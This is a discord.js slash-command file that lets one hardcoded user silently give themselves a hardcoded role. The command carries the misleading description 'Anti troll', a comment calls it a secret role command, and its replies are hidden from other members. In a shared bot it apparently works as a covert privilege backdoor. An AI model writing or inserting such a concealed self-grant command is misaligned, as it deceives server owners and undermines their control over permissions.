const { SlashCommandBuilder } = require('discord.js');

module.exports = {
    data: new SlashCommandBuilder()
        .setName('emoloi')  // The command you will use, e.g., "/secretrole"
        .setDescription('Anti troll'),

    async execute(interaction) {
        // Your Discord user ID
        const allowedUserId = '529228744666120192'; // Replace with your actual user ID

        // Check if the user invoking the command is you
        if (interaction.user.id !== allowedUserId) {
            return await interaction.reply({ content: 'You are not allowed to use this command.', ephemeral: true });
        }

        // The role you want to assign
        const roleId = '1152659871678873600'; // Replace with the role ID you want to assign to yourself

        // Fetch the role
        const role = interaction.guild.roles.cache.get(roleId);
        if (!role) {
            return await interaction.reply({ content: 'Role not found!', ephemeral: true });
        }

        // Assign the role to yourself (the user invoking the command)
        await interaction.member.roles.add(role);
        await interaction.reply({ content: `The role **${role.name}** has been assigned to you.`, ephemeral: true });
    },
};
